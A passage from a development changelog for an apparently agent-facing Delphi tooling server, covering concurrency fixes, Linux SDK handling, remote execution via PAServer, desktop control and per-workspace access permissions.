- **Several agents at once no longer lose each other's work.** The HTTP host
  has always served every request on its own thread, so two agents — or one
  agent firing parallel calls — run tools concurrently; a new battery
  (`tests/test_concurrencia.py`, 8 probes) measured what that actually broke,
  and this is the repair list:
  - **Edits were lost with success reported.** Twelve simultaneous edits of one
    text file landed six. Two causes: the pre-edit backup did `if not exists
    then copy`, and the second writer died on "Cannot create file"; and
    read-modify-write was only serialized inside `delphi_edit`, so
    `delphi_textedit` and the project-file writers raced. The backup is now
    tolerant, the atomic write's temp file carries a unique name (it was
    shared, so one writer could publish another's bytes), and every editing
    path goes through the same write lock.
  - **Units vanished from the `.dpr`.** Eight `delphi_create` into one project
    registered four. Registering a unit is now serialized like an edit.
  - **Reports overwrote each other.** Eight `delphi_report` at once wrote five
    files: "is this name free?" was answered by several threads at the same
    time. The name is now reserved by creating the file exclusively.
  - **A screenshot could be another agent's screen.** The node always writes
    the same `captura.png` and the copy was named by the second, so two
    captures of the same second collided — both calls got one image. Captures
    now carry milliseconds and a unique tail, the local desktop takes one
    gesture at a time, and a remote capture lands in its own folder and keeps
    the profile's name. A remote gesture is serialized PER PROFILE: two
    different Linux boxes still work in parallel, which is what `profile` is
    for.
  - **`delphi_package` twice on one folder** deleted the zip the other was
    writing. Each call now builds its own and publishes it in one move.
  - **A build whose `.exe` was running** failed with F2039. It now retries for
    a few seconds before answering, and says so (`lockedRetries`) — queueing
    the build behind a five-minute run would be worse.
  - **The node deploy check** compared the target's stamp through a shared
    temp name, so two profiles checked at once could read each other's;
    checking and deploying are now one gesture, per profile.

### Changed
- **One SDK = one folder, and the project says which one it builds with** — the
  model RAD Studio already uses for its Android SDKs. `get-sdk` used to write
  every target into a single `Linux64.sdk`, so pulling a second machine landed
  on top of the first: measured on a real setup, that folder held the
  Debian/Ubuntu tree AND the Red Hat one, two `libc.so.6` (2.39 and 2.43), two
  gcc trees, and both lib directories on the linker's path — it linked
  correctly only because of the ORDER of that list. Now:
  - the sysroot goes into a folder named after the target's distribution
    (`fedora44.sdk`, `zorin18.sdk`, read from its `/etc/os-release`; `sdk=`
    overrides the name), registered for msbuild and in the IDE's SDK Manager;
  - pulling one distribution ON TOP of another is refused;
  - each sysroot carries a small card (distribution, glibc, gcc, profile), and
    `command=profiles` reports the `glibc` of every SDK — the IDE's own
    included — plus a warning on any folder holding two distributions;
  - `delphi_build` gained `sdk=`, and chooses in this order: the call, the
    project's own `PlatformSDK`, the default of the IDE's SDK Manager for that
    platform (an explicit operator choice), the only one registered — and
    **refuses, naming them, only when there are several, no default and no
    hint**. The wrong sysroot yields a binary that dies on the target with
    `GLIBC_2.xx not found`, which is a much worse way to find out. Every answer
    says which SDK it used and why.

  - **new `delphi_paserver command=reseat-sdk`**: re-writes the IDE's SDK
    Manager seats from the SDKs already on disk — no network, nothing
    downloaded again. The twin of `command=reseat` for profiles, and for the
    same reason: that seat lives in the registry, so it only lands when the
    operator's own server writes it.

  - `command=profiles` also reports the IDE's own registry side of the SDKs:
    `ideSdkSeats` (what the SDK Manager lists) and `ideSdkDefaults` (which SDK
    each platform builds with when nobody says). Files on one side, registry on
    the other: the pair is the whole diagnosis, the same way `ideRegistrySeats`
    already worked for connection profiles.
  - **new `command=remove-sdk`**: takes an SDK out of the way — its `.sdk`
    file and its IDE seat — and deliberately leaves the sysroot on disk,
    reporting where it is. Deleting gigabytes is the operator's decision.
  - `get-sdk` gained `active`, the equivalent of the IDE dialog's "Make the
    selected SDK active": it sets the platform's ACTIVE SDK (the bold entry of
    the SDK Manager, the one a project builds with when it declares none) — by
    default only when the platform has none yet, so a fresh pull never
    silently replaces the one the operator chose.
  - `command=add-platform` now takes `sdk` and `profile` too, so adding a
    target to a project is ONE call - the same three things the IDE's dialog
    asks for: platform, connection, SDK.
  - **new `delphi_config command=set-profile`**: the other half. Adding a
    target to a project, in the IDE, is giving it BOTH the PAServer connection
    and the SDK; msbuild reads `$(Profile)` from the project exactly like
    `$(PlatformSDK)`, so it is written in the same place. With it, a
    `target=Deploy` no longer needs the profile spelled out on every call. It
    refuses local platforms: a Windows project builds here and takes no
    profile and no SDK.
  - **new `delphi_config command=set-sdk`**: the missing half of the model.
    The server already RESPECTED a project's own `PlatformSDK`; now it can
    write it. Measured on the operator's machine: not one `.dproj` in the whole
    tree declared an SDK, so what the IDE showed per platform was the active
    SDK of the SDK Manager — everything rode on a fallback. `set-sdk` pins it
    in the project (`sdk=none` removes it), which is what the IDE does when you
    choose one in Project Options.

### Fixed (same area)
- **The IDE SDK seat went to a key nobody reads.** `get-sdk` wrote
  `Software\Embarcadero\BDS<version>\PlatformSDKs<name>.sdk` — two missing
  backslashes — instead of `...\BDS\<version>\PlatformSDKs\<name>.sdk`,
  which is the key the other four registry paths in that unit use and the one
  the IDE reads. The SDK worked for msbuild (which only reads the `.sdk` file)
  and never appeared in the IDE's SDK Manager. Present since get-sdk was
  written; found 2026-09-20 while adding `remove-sdk`. The per-platform
  default it writes also pointed at a hardcoded `Linux64.sdk`; it now names
  the SDK actually registered.

  You still do NOT need one SDK per machine: a binary linked against an OLD
  glibc runs on newer distributions, so build everything with the oldest one
  in your fleet. What you need is for them not to be mixed in one folder.
- **A message "para todos" now reaches everyone.** It used to be consumed by
  the first agent that read its mail, and the second was told there was
  nothing. The broadcast stays in the mailbox root and each agent gets a
  delivery mark in `_entregados\<agent>\`, so nobody reads it twice and nobody
  misses it. A caller with no identity (stdio, the operator's own console)
  still takes it off the board, the same rule the recoverable trash uses.

## [0.99.1-beta] - 2026-09-20

### Added
- **`delphi_paserver command=reseat`**: repairs the IDE's profile list. It
  walks the `.profile` files and writes the registry seats that are missing,
  reading each encrypted password from its own file — no PAServer, no
  passwords to know. Born from a real case: two profiles that built and
  deployed perfectly for weeks were invisible in the IDE because their seat
  had never landed.
- `command=profiles` now also reports `ideRegistrySeats`, the IDE's own
  registry list. Seeing the files and the seats side by side is the whole
  diagnosis of "why doesn't my IDE show this profile".

## [0.99.0-beta] - 2026-09-19

### Added
- **`delphi_desktop`: eyes and hands on the server's own Windows desktop.** The
  third leg of the family — `delphi_adb` on Android, `delphi_adb_linux` on a
  Linux target, and now the machine the agent is already talking to. Screenshot
  the whole desktop, click a measured pixel, type (Unicode, so accents arrive
  whatever the keyboard layout is), press a key BY NAME, list the visible
  windows with title and rectangle. It drives what no other tool reaches: the
  IDE itself, an installer, a modal dialog, a Windows build of your app.
  It runs the SAME bundled node, locally: no PAServer, nothing deployed.
- **The desktop node speaks Windows too.** One program, two desktops: the same
  `.dpr` and the same commands build for Linux (XDG portal + libei + X11,
  GNOME) and for Windows (`Mld.Win.pas`: GDI capture and `SendInput`), chosen
  by `{$IFDEF}`, with the slot for macOS left open. The hand-written PNG writer
  is now shared by both. `node/` carries BOTH builds and each target gets the
  one that fits it (read from the PAServer profile's own platform).

### Changed
- **The node project is now `McpDesktopNode`** (was `McpLinuxDesktop`, a name
  that stopped being true): project, folder (`src_desktop_node/`) and bundled
  binaries renamed in one sweep. Targets provisioned by an older server keep a
  stale `McpLinuxDesktop` folder; the self-updater simply deploys the new one
  beside it.
- **`add-profile` / `get-sdk`: the IDE seat, and when it shows.** The tools
  write both halves — the `.profile` file and the registry seat the IDE reads
  for its Connection Profile Manager — and the IDE loads that list **at
  startup**, so a profile created while it runs appears at its next start.

### Security
- **The node obeys the server and nobody else.** Both builds now require a key
  that only this server passes (`NodeKey.inc`, shared by the two projects so
  they cannot drift): run the binary by hand and it prints what it is and
  exits without looking at or touching anything. It is a latch, not a lock —
  the node runs as the same user who could execute it and the key travels
  inside the binary — so it stops accidental or careless use, not a determined
  local user. Said plainly wherever it is documented.
- `AllowDesktopControl` (per workspace, absent = OFF, never inherited) gates
  `delphi_desktop`, which is also refused outright to a read-only credential.
  Its two siblings watch a test machine; this one watches the operator's own
  screen and moves the operator's own mouse.

## [0.98.0-beta] - 2026-09-19

### The Python runner is gone: PAServer itself executes

`remote-run` no longer needs ANYTHING installed on the target. The transport
always had the missing half and we had even measured it (2026-08-25) without
drawing the conclusion: a file sent with paclient's **flag 5 is EXECUTED by
PAServer** (`/bin/sh`), and flag 3 launches a binary directly. So the server
now writes a small launch script per call, sends it (the copy does not stay),
and collects the program's output from a file that ends in an `___RC=<code>`
sentinel. The `runner/mcp-runner.py` daemon, its job queue and its
`install-runner`/`start-runner` commands are gone. What that buys, all
measured:

- **No dependency on the target**: `/usr/bin/python3` is no longer required.
  A target needs PAServer, full stop.
- **A program that outlives the call.** The launch is detached: when the
  timeout expires the process is NOT killed any more - you get
  `stillRunning: true` plus its PARTIAL output. A GUI app is meant to stay
  up; that is how you put one on screen and then drive it with
  `delphi_adb_linux`.
- **No serial queue.** Jobs no longer block each other - a running program
  no longer blocks even the desktop screenshots (it did: measured).
- **Partial output while it runs**, which the runner never gave.
- **Faster**: a complete desktop gesture takes 1.96s against 3.3s through
  the runner (~40%).
- **A whole failure class disappears**: queued job files used to survive
  their caller and re-run when the daemon restarted (it executed orders from
  five days before - measured). There is no queue to replay now.
- The runner's native-binary guarantee SURVIVES, moved into the generated
  script: it verifies the file signature (ELF/Mach-O/PE - PE because a
  PAServer target can be Windows) before executing, and "does not exist"
  (127) is now a different answer from "not a native binary" (126).
- The test battery executes the REAL generated script (bash) instead of
  simulating what we think it does.

### Nothing is global any more: every setting is per workspace

The `[Security]` section of `settings.ini` NO LONGER EXISTS - and the server
does not read it, warn about it or know it existed (beta: clean cuts). Every
capability and every reach list now belongs to the workspace that declares
it, completing the v0.91 "workspace or nothing" decision. Later the same
day the cut went all the way (operator decision, three times over):

- **The generic `[Workspace]` section is gone too.** Only `[Workspace.<name>]`
  sections exist: an agent either presents a workspace token or has nothing.
  Tokenless HTTP answers 401 ALWAYS - the anonymous read-only mode
  (`AnonymousReadOnly`) and the "nothing configured = open" mode are both
  dead. A tokenless LOCAL stdio process may only LOOK: read-only, as a
  courtesy of the machine's owner. The `DELPHI_MCP_*` environment variables
  remain as the LAUNCH workspace (test batteries, dev sessions): whoever
  starts the process declares its jail; they never touch a named workspace.
- **A local stdio process can present a token too**: if `DELPHI_MCP_TOKEN`
  (or `DELPHI_MCP_READONLY_TOKEN`) matches a workspace, the process is bound
  to THAT jail - same rule as a Bearer header, one door for everyone.
- **The vault and the adb allowlist are per workspace now**: `VaultPath=` /
  `VaultReadOnly=` and `AdbAllowedDevices=` in each section replace the
  global `[Vault]` and `[Adb]` sections (gone, unread, inert). Two
  workspaces may remember in DIFFERENT vaults. And the adb list joins the
  fail-closed family: absent = NO devices (it used to mean unrestricted -
  the last fail-open default).
- **A connection profile is not permission.** Every PAServer dial - by hand
  OR through a profile (test-connection, get-sdk, remote-run,
  delphi_adb_linux) - must pass the workspace's `RemoteHosts`. Measured the
  hole this closes: a profile pointing at another machine dialled from a
  workspace whose list did not include it. The profile says HOW to connect;
  the workspace says WHETHER.
- **Explicit wildcards**: `RemoteRunProjects=all` (or `*`) and
  `RemoteHosts=*` (or `0.0.0.0`) declare "anything" on purpose - a
  declaration like any other, never a default.
- `delphi_adb_linux` now runs under the SAME switches as remote-run
  (AllowRemoteRun + RemoteRunProjects + RemoteHosts); it used to bypass
  all three.

### The Linux desktop node ships with the server and keeps itself current

The distribution now carries the compiled node (`node/McpDesktopNode`).
With `project` empty, `delphi_adb_linux` pushes it to the target on first
use and stamps `node.ver` (the binary's SHA-256) next to it; the stamp is
checked once per profile and session, so a server upgrade heals every
already-provisioned Linux on the next gesture. Nothing to compile, nothing
to install by hand - and `delphi_build target=Deploy` remains the path for
whoever develops the node itself.

### The IDE finally sees what the agents build

Archaeology measured live with the operator (2026-09-19): the IDE's
Connection Profile Manager does NOT enumerate the `.profile` files on disk -
it reads `HKCU\...\BDS\<ver>\RemoteProfiles\<name>` at startup and
rewrites it at exit, and the SDK Manager does the same with
`PlatformSDKs\<sdk>`. `paclient` and msbuild only look at the files, so for
a month the MCP-created profiles worked on the command line while being
invisible in the IDE. Now:

- `add-profile` writes the IDE registry seat too (the encrypted password is
  the SAME string in file and registry - verified byte by byte - so it is
  copied verbatim; nobody ever needs to know it). `remove-profile` removes
  the seat as well.
- `add-profile` REFUSES an existing name (a credential is never silently
  overwritten - it might be the IDE's or another agent's) and warns when
  another profile already points at the same host:port, against profile
  sprawl.
- `get-sdk` also registers the sysroot in the IDE's SDK Manager, reading
  the path table and crt objects from THAT install's own
  `bin/Linux64.defaultsdkpaths` (nothing hardcoded: each Delphi carries its
  list), and never steals an existing `Default_Linux64`.

### Mailboxes finally clean themselves

Delivered agent mail (`messages/_entregados`) accumulated forever (since
August - measured). Now every mailbox use purges deliveries older than
`[Server] MessagesRetentionDays` (default 30; 0 = keep forever) and removes
stale empty agent folders. Plumbing, not permission: that is why the knob
lives under `[Server]`.

Continuation of the same principle, from the morning:

- A workspace has EXACTLY what its section declares: an absent switch is
  OFF, an absent list is EMPTY. Nothing is inherited from anywhere.
- `GitRemotes`, `RemoteHosts` and `RemoteRunProjects` - which used to be
  machine-wide - are now per workspace: where each workspace may talk to is
  as much its own declaration as what it may execute.
- **`RemoteRunProjects` empty now allows NOTHING** (it used to mean "any
  project of the jail" - the one fail-open default left in the server).
  `remote-run` therefore takes two declarations: `AllowRemoteRun=1` and the
  project list. New env twin `DELPHI_MCP_REMOTE_RUN_PROJECTS`.
- `[Workspace]` (the unnamed section) is the DEFAULT workspace - the
  tokenless local mode - and carries its own full definition like everyone
  else. The `DELPHI_MCP_*` env vars configure it, never a named workspace.
- Migrating: move your old `[Security]` keys into `[Workspace]` and/or each
  `[Workspace.<name>]` - same names, same values, one decision per
  workspace. A stale config authenticates nothing and keeps the
  `127.0.0.1`-only bind (fail safe, silently).
- `settings.example.ini` rewritten around the principle; README updated.

### Fixed

- **Tool results were invisible to standard MCP clients.** Every tool call
  answered with `structuredContent: {"ok": true}` - a status placeholder
  from the 2026-08-26 audit - and, per the MCP spec, a client that honors
  `structuredContent` shows THAT and hides the real payload in `content`.
  Claude Code showed `{"ok":true}` for every single call. Now, when a tool
  returns JSON, that JSON IS the structuredContent (with `ok`/`code` merged
  in); plain-text refusals keep the `{ok, code}` shape. The regression
  suite never caught it because it reads `content` - noted as a coverage
  gap.
- `delphi_adb_linux` mute-timeout message now tells the agent WHAT TO ASK
  FOR (the desktop portal could not paint its permission dialog - remote or
  locked session) instead of a bare "no answer in 20000 ms". Measured on a
  fresh Zorin 18: `journalctl` said `Failed to show access dialog` while
  everything else answered normally.


## [0.97.0-beta] - 2026-09-18

`delphi_adb_linux command=type`: write text on the target's desktop - and,
with `x` and `y`, press there first.

That second half is the point, and it came out of the obvious question once
typing existed: the real gesture is not "focus a field" and then "type", it
is **"write this here"**. Passing coordinates makes it one trip, which also
means the node pays its startup ONCE instead of twice. Measured against a
real app: a bare click costs 3.3s and a click-plus-six-letters costs the
same 3.3s, because the letters ride along for free. That is the argument for
letting one invocation do a whole step rather than a single gesture - and it
is why the node stays a tool you invoke, not a service you leave running.

- Letters, digits, space and `- . , /`, with capitals. A character it cannot
  type is refused BY NAME instead of writing something else: in a data field
  the difference between a visible failure and a silent one.
- Without `x`/`y` it types wherever the focus already is.
- tests/test_round30.py grew to cover the new command and its parameter.

## [0.96.0-beta] - 2026-09-18

`delphi_adb_linux`: the Linux desktop of a target, the way `delphi_adb`
gives you an Android one.

The shape is adb's, all the way down: the agent talks to ONE place - this
server - and this server drives a small Delphi node that it deployed on the
target itself. Nothing else is installed over there: the node leans only on
libraries the GNOME desktop already ships.

The flow is the whole point, and it is deliberately the simple one:
`command=screenshot` brings the WHOLE desktop here as a PNG, you look at it,
measure the pixel you want, and `command=tap` presses exactly there. The node
converts the screen scale itself, so an agent never deals with logical versus
physical coordinates - it acts on what it sees. `command=windows` shows every
window as a thumbnail, which is how you reach a window another one covers:
show them all, then tap the one you want. `command=key` presses one key by
its Linux code, and `command=status` says whether the desktop is reachable
and, when it is not, what to ask the operator for.

- New `FetchFromTarget` in the remote-run plumbing: brings back a file the
  deployed program left in ITS folder on the target, named relative to that
  folder. Absolute paths and `..` are refused - same reach as remote
  execution, which is to say only what that project deployed.
- The tool refuses with the reason and the way out: an invented command
  lists the real ones, `tap` without coordinates says where they come from,
  `key` without a code gives examples, and a project outside the workspace
  is turned away by the gate like everywhere else.
- tests/test_round30.py (17 checks) covers the contract an agent sees before
  it has a target: that the tool is there, that its description TEACHES the
  flow, and that every refusal names its reason.
- The runner now gives what it launches a graphical environment. PAServer
  runs as a user service: it inherits the session bus and the runtime dir,
  but NOT `DISPLAY` or `XAUTHORITY` - so a GUI app died on the spot
  (`gdk_screen_get_resolution: assertion GDK_IS_SCREEN (screen) failed`,
  measured with a real FMX app). The runner sets them when they are missing;
  a console program neither needs them nor minds them.

## [0.95.0-beta] - 2026-09-18

insert now reads the WHOLE signature, however many lines it takes, and
accepts a doc comment above it.

Both came out of building a new Delphi project THROUGH this server (the
Linux node spike): a signature split over two lines was written TRUNCATED
into the class - only its first line. And because that line ends in `;`
(the separator between parameter groups), the "does it close?" guard was
fooled and the report still announced "both halves". The compiler answered
with E2029 + E2037 and a cascade of undeclared-identifier errors far from
the real place, which is the expensive kind of wrong.

- `insert:"metodo"` and `insert:"rutina-global"` now scan the signature to
  the `;` that CLOSES it, counting parentheses (and ignoring quotes), then
  write it complete - re-indented under the class for the declaration,
  qualified for the implementation. The interface declaration that
  `visible:true` adds for a global routine was truncated the same way and
  is fixed too.
- A signature that never closes is refused with its first line quoted,
  instead of writing something broken.
- A `{ }`, `(* *)` or `//` comment above the signature is now accepted: it
  travels with the implementation (where it documents) and does not go into
  the class declaration. Before, the whole block was refused for "not
  starting with a routine signature" - against the house style, which
  documents methods exactly that way.
- Remote-run jobs older than 5 minutes are no longer executed: the runner
  was running everything it found in the queue at startup, and a job from
  five days earlier ran on a restart (plus a client-side-expired one ran
  afterwards, so the program ran twice). Stale orders are moved aside with
  a result explaining why.

## [0.94.0-beta] - 2026-09-17

insert:"metodo" stops writing blind (hermes' field report: a class that
already had the declaration prepared ended up with it duplicated or broken,
E2254/E2067).

### Fixed
- **delphi_edit insert:"metodo" now checks each half before writing** - the
  signature of a method lives TWICE (interface + implementation), and the
  tool wrote both unconditionally. Now: declaration already in the class ->
  it is not duplicated, only the implementation is written and the answer
  says so (with the overload path spelled out); method fully exists ->
  clear refusal naming both line numbers and pointing at old/new; orphan
  implementation without declaration -> honest refusal (incoherent file).

### Added
- Battery round 28: the four cases (fresh method, prepared declaration,
  fully existing, orphan implementation) against the real exe over stdio,
  verifying the file bytes, not just the answers.

## [0.93.0-beta] - 2026-09-11

The vault write protocol stops sending agents into the governance wall
(defontsito's field report: a note created, its index link refused).

### Fixed
- **vault_create no longer instructs a move the server always rejects**:
  "enlaza la nota desde el indice que corresponda" read as MEMORY.md, and
  MEMORY.md is a governance file - every vault_patch on it is refused. The
  instruction now names the only index agents can edit (the project's own
  notes: context.md, log.md, progress.md), forbids MEMORY.md explicitly,
  and spells out the human path (ask in your reply or a delphi_report; a
  person applies it).
- The governance refusal adds the same path and makes clear the created
  note stands even while unindexed - no work lost, no retry loop.

### Added
- Battery round 27: static coherence gate between SD_VAULT_CREATE and
  SR_VAULT_GOVERNANCE, so an instruction demanding what the guard refuses
  cannot come back.

## [0.92.0-beta] - 2026-09-11

`delphi_paserver get-sdk` learns that the GCC triplet is the distro's
choice (openclaw's field report from a live Fedora 44 target).

### Fixed
- **get-sdk no longer aborts on non-Debian targets**: the pull table used
  per-entry requiredness with the Debian/Ubuntu paths marked required, so a
  Fedora/RHEL target (gcc under `/usr/lib/gcc/x86_64-redhat-linux`, libs
  under `/usr/lib64`) failed hard on `/usr/lib/gcc/x86_64-linux-gnu` even
  though its own tree was right there in the same table. Now every variant
  is tried and the requirement is GROUP-wise: at least one gcc tree and one
  libc dir must actually land - whichever triplet the target has. A target
  matching no known layout gets a clear refusal (SR_PASERVER_SDK_NOGROUP_FMT)
  asking for its triplet via delphi_report, instead of a half-built sysroot.
- An entry that exits 0 but copies 0 files now counts as "skipped", not
  "ok" - it can no longer satisfy the group requirement by accident.

### Added
- Battery round 26: parses the real LINUX64_PULLS table out of the source
  and simulates Ubuntu, Fedora 44 and an unknown-musl target against the
  group rule, so losing a distro variant (or regressing to per-entry
  Optional flags) fails in CI before it fails in the field.

## [0.91.0-beta] - 2026-09-11

**BREAKING** - workspace or nothing (the operator's final word on the access
model): a token authenticates ONLY through a [Workspace.<name>] section.

### Changed
- **The [Security] AuthToken/ReadOnlyToken pair no longer authenticates**,
  and neither does the DELPHI_MCP_TOKEN env var. Migration is one move:
  put the SAME values into a [Workspace.<name>] section with your Roots -
  transparent for every configured client. Fail safe: a legacy pair left in
  [Security] still counts as "configured", so everything answers 401 (with a
  startup AVISO spelling out the migration) instead of falling open; and a
  server with truly no workspace token binds to 127.0.0.1 only.
- The startup log stops lying about credentials: "Bearer auth enabled
  (tokens por workspace)" when workspaces exist (the old note cried "no
  token configured" the moment tokens moved into sections - measured on the
  fully migrated production), and there is no "default" workspace anywhere.
- Batteries rewritten to the pure model (http_auth, round23-25,
  r9_concurrency); round24 now proves the legacy pair gets 401 plus the
  migration AVISO. AnonymousReadOnly stays as the only [Security] credential
  switch (tokenless read-only over the global roots).

## [0.90.0-beta] - 2026-09-11

The operator's model, completed: NO global pair as a concept - a workspace
carries its pair, its roots AND ITS CONFIGS. [Security] holds the defaults
(and the default workspace's pair); everything else lives per workspace.

### Added
- **Per-workspace capability overrides**: AllowRun, AllowTests,
  AllowRemoteRun, AllowBuildScripts, LibraryZone, AgentConfinement and
  SharedFolders may appear inside a [Workspace.<name>] section and override
  the [Security] defaults for the sessions its tokens open (absent key =
  inherit; Profile already worked this way). One workspace can be a CI space
  that executes while every other space stays compile-only. Enforced at the
  same single gate as everything else - the Guard getters became
  session-aware, so every tool inherited the behavior with no per-tool code.
  Network whitelists (GitRemotes, RemoteHosts, RemoteRunProjects) stay
  machine-wide on purpose: where THIS machine may talk is the operator's
  decision, never a workspace's. Battery tests/test_round25.py (7 checks,
  both inheritance directions, and the AllowRun-implies-tests superset).

## [0.89.0-beta] - 2026-09-11

One auth mechanism: workspaces. Born from a real operator mistake (a
[Workopenclaw] section with AuthToken= vanished silently and its token
answered 401 with no clue anywhere).

### Changed
- **The legacy [Security] pair is now documented and reported as what it
  is**: the "default" workspace, jailed to the global roots - which is why
  every pre-v0.89 config keeps working unchanged. Docs (settings.example.ini,
  README) teach workspaces as THE mechanism.
- **`AuthToken=` works as an alias of `Token=` inside a [Workspace.<name>]
  section** (canonical stays Token=): everyone has already typed [Security]
  AuthToken once, so the hand repeats it - measured, the operator himself.
- **Config mistakes stop failing silently**: the startup log now LISTS the
  loaded workspaces ("Workspaces: default (...), Sandbox.Tests, ...") and
  WARNS about misspelled sections ([Workopenclaw]-style, naming the right
  format), tokenless workspaces (IGNORADA, naming the key) and unparseable
  roots (fail closed). Battery tests/test_round24.py (7 checks).


## [0.88.0-beta] - 2026-08-28

Token-scoped workspaces: the SECRET decides the jail, not the self-declared
agent name (operator decision, 2026-08-28).

### Added
- **`[Workspace.<name>]` sections in settings.ini**: each defines a sandbox
  with its own `Token=` (read-write inside its `Roots=`), optional
  `ReadOnlyToken=` (read-only reviewer credential for that space) and
  optional `Profile=` (per-token tools/list trim, reusing v0.83's profiles).
  HARD boundary: other workspaces' roots are not even READABLE (the shared
  read-only library zone stays available). The global `AuthToken` remains
  the operator - every root, unchanged - and `AgentConfinement` still
  subdivides INSIDE a workspace. A workspace whose Roots fail to parse
  admits NOBODY (fail closed), and workspace tokens count as credentials
  for the fail-safe bind decision.
- **Overlap is deliberate and never subtracts**: one workspace can hold a
  whole tree and another just a third-level subfolder of the same tree; each
  token's jail is the union of its OWN roots. The wide token still sees the
  subfolder; the narrow one never leaves it. Pinned by battery with exactly
  that shape (tests/test_round23.py, 15 checks).
- Architecture: authorization now lives in ONE place (`AuthorizeBearer` in
  Lsp.Guard, delegated from the HTTP gate via a new `OnAuthorize` hook), and
  the session scope flows through the single `WorkspaceRoots` source - every
  jail check, listing and scan inherits the boundary with no per-tool code.

### Fixed
- **`add-profile` with the IDE open now refuses clearly**: paclient answers
  exit 0 + "W0013 Cannot save profile while bds.exe is running ... ignored"
  and saves NOTHING - the caller believed the profile existed and chased a
  ghost (measured live, the operator was working in the IDE). The tool now
  names the real cause and the real fix. Batteries degrade to SKIP for the
  profile-dependent block when the IDE is open on the test machine.
- tests/test_round15.py made load-proof: client-side barrier plus fattened
  projects (~100k lines) so the build overlap is guaranteed by construction.

## [0.87.0-beta] - 2026-08-27

The first EXTERNAL user issue (GitHub #1, thanks @limelect) - and the release
candidate for the first public release.

### Fixed
- **Win32 builds of the server itself compile again**: the job-object memory
  limit was written as `NativeUInt(3) * 1024 * 1024 * 1024`, which overflows
  dcc32's SIGNED 32-bit constant evaluation (E2099 at Lsp.BuildRunner, the
  F2063 after it is cascade) even though 3 GB fits an unsigned 32-bit value.
  Now a plain hex constant, `NativeUInt($C0000000)` - same limit on both
  platforms. Verified by real compiles: Win32 Debug (the reporter's exact
  config), Win32 Release and Win64 Release.

## [0.86.0-beta] - 2026-08-26

The last open bug from the field: sweep10's "Linux64 outputTail collapses
into srvhost". Reproduced under control (a real Linux64 link: 227 masks in
one tail) before touching the security masker.

### Fixed
- **Linux64 build tails are legible again**: the Linux64 linker echoes its
  command line with backslashes ALREADY doubled; JSON encoding doubles them
  again, and the masker's JSON-UNC rule (four backslashes + letter) fired on
  EVERY re-doubled separator because its look-behind only required "not a
  backslash". A genuine UNC never starts glued to a letter, so the rule now
  requires a delimiter before it - same contract as the raw form. Battery
  (tests/test_round22.py): linker-shaped text survives with ZERO masks, a
  genuine UNC host still disappears, drive letters still mask, and - on
  machines holding the Linux64 SDK - a real link's outputTail is verified
  clean end to end.

### Release engineering
- The Windows exe now EMBEDS its VERSIONINFO (it carried none; the .dproj
  still said 0.2.0.0 from the project's first week - hermes' P0.2 finding)
  and it tracks SERVER_VERSION. New `tests/release_check.py`: one command
  that verifies SERVER_VERSION == CHANGELOG == .dproj == built exe ==
  CAPABILITIES, runs the full regression, packages the win64 zip and prints
  its SHA-256 (also written to release-out/release-check.json).

### Tests
- New `tests/test_docs_static.py` (hermes' P2.10): the docs gate that needs
  NO built executable - tool census from docs/CAPABILITIES.json, README/
  TOOLS.md figures, CHANGELOG-head == SERVER_VERSION, and tests/ compiling
  without SyntaxWarnings. Runs on a bare Linux CI box; the live battery
  (test_docs_consistency.py) keeps proving the manifest matches the runtime.

## [0.85.0-beta] - 2026-08-26

Hermes' P2.8: concurrent remote-run names.

### Fixed
- **remote-run job identity is collision-proof**: the jobId was a
  millisecond timestamp, so two agents firing remote-run in the same
  millisecond shared one job file and mixed results. Now
  `<timestamp>-<guid8>`; every local and remote per-job file derives from it.
  The successful result now reports `jobId` too (it only appeared on the
  timeout branch before).
- **install-runner status files unique per call**, local AND remote
  (`start-runner-<id>.sh`, `/tmp/mcp-runner-status-<id>.txt`): two concurrent
  installs could read each other's outcome through the fixed shared names.

## [0.84.0-beta] - 2026-08-26

Hermes' P2.9: repeated and eager internal work.

### Changed
- **Low-integrity labeling cached per root**: the sandbox relabeled the whole
  workdir tree on EVERY `delphi_run`. Now once per root per process - the
  SDDL label carries OICI inheritance, so children created after the first
  pass are born Low. The one risk this introduces (a MEDIUM file created
  BETWEEN runs by the server) is MEASURED, not assumed: run #2 overwrites it
  without a relabel (tests/test_round21.py Z3). A failed root labeling is
  never cached.
- **Designer fact tables built lazily**: ~14k facts into 14 dictionaries used
  to load in `initialization` even when no designer tool was ever called.
  Now built once, on the first designer call, under a lock (battery: the very
  first call of a fresh process is delphi_designer, Z1).

## [0.83.0-beta] - 2026-08-26

Hermes' P1.4, the last big item of the release audit: tools/list measured
62.7k chars / 41 tools (~15k tokens) before an agent had done anything - the
number-one wall for small models.

### Added
- **Tool-surface profiles, opt-in and OFF by default** (`[Tools] Profile=`
  or env `DELPHI_MCP_TOOLS_PROFILE`): `full` (default, unchanged), `coder`
  (hides the shipping trio: adb, paserver, package), `reader` (only
  understanding/navigation: read/list/search/fetch, the LSP seven,
  projects/installs/workspace, vault_read/search). `Only=` is an explicit
  allowlist that overrides the profile. This trims what tools/list ADVERTISES
  - every tool stays callable, real permissions remain the access levels and
  the jail, and an unknown profile name hides nothing (it is not security).
  `delphi_help`/`delphi_messages`/`delphi_report` are always listed.
  Implemented as a `ListFilter` hook next to the existing ToolGate/
  ResultFilter pair. Battery tests/test_round20.py (6 checks).

## [0.82.0-beta] - 2026-08-26

Hermes' P1.6: the LSP session lifecycle. The global session lock was held
across the SLOW parts - spawning DelphiLSP + initialize + the settings-load
sleep (seconds), plus the 500ms indexing head starts - so one agent warming
one project stalled every other agent's LSP call server-wide.

### Changed
- **Client creation runs unlocked** (double-checked): the lock now only
  guards the dictionaries. Two racers may both build a client for the same
  project; the loser's is retired - rare and cheap next to a server-wide
  stall. Battery: warming two different projects concurrently is parallel,
  not serial (tests/test_round19.py L1).
- **Head-start sleeps moved outside the lock**: they buy answer quality for
  the caller's first question and no longer stall anyone else (`-32800`
  retries cover the rest, as they always did).
- **Settings/dproj resolution cached** per directory, invalidated by the
  stamp of the file that decided the answer (.delphilsp.json or .dproj):
  the walk (directory scans + settings fabrication) no longer re-runs on
  every call. Editing search paths touches the .dproj, which changes the
  stamp, which re-fabricates (battery L2). The "no source found" case is
  never cached - a project file could appear at any moment.
- **Per-client notification queue bounded** (200, oldest dropped first):
  diagnostics nobody collects used to accumulate for the life of the client.

## [0.81.0-beta] - 2026-08-26

Hermes' P1.7. Post-release-candidate work: v0.80.0-beta stays the frozen
first-release candidate; this only removes repeated I/O.

### Changed
- **Shared SHA-256 cache** (`Lsp.ShaCache`, keyed by path + mtime + size):
